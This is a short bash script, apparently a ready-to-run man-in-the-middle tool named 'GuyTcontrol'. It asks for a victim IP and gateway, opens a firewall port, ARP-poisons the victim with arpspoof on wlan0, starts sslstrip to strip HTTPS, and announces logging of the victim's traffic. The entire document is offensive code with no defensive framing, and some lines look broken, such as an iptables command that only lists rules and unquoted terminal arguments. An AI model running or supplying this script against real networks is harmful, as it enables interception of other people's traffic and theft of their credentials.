echo "Welcome to GuyTcontrol - man in the middle script."
echo "Please type the ip of your VICTIM: "
read VICTIM
echo "Please type the ip of your DG: "
read DG
echo "Please type REDIRECT port number: "
read REDIRECT
iptables -I INPUT 1 -p tcp --dport $REDIRECT -j ACCEPT
iptables -t nat -L PREROUTING
echo "Strting arp poisoning on another terminal..."
sleep 5
echo "."
sleep 5
echo ".."
sleep 5
echo "..."
sleep 5
gnome-terminal -e arpspoof -i wlan0 -t $VICTIM -r $DG
echo "Start sslstrip -l $REDIRECT on another terminal..."
sleep 5
gnome-terminal -e sslstrip -l $REDIRECT
sleep 5
echo "Starting log your VICTIM $VICTIM trafics"

